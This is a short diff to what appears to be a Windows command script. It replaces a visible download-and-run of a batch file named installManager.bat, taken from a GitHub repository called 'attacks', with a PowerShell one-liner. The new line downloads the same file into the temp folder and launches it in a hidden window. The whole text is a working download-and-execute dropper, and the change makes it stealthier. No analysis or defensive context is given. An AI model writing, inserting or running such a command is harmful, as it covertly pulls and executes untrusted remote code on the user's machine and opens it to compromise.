@@ -1,3 +1,1 @@
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/installManager.bat' -OutFile $env:USERPROFILE\Documents\installManager.bat"
-
-cmd /k start "" "%USERPROFILE%\Documents\installManager.bat" print.py
+powershell -w h -c "iwr https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/installManager.bat -o $env:tmp\im.bat;Start-Process -WindowStyle Hidden $env:tmp\im.bat -ArgumentList 'print.py'"
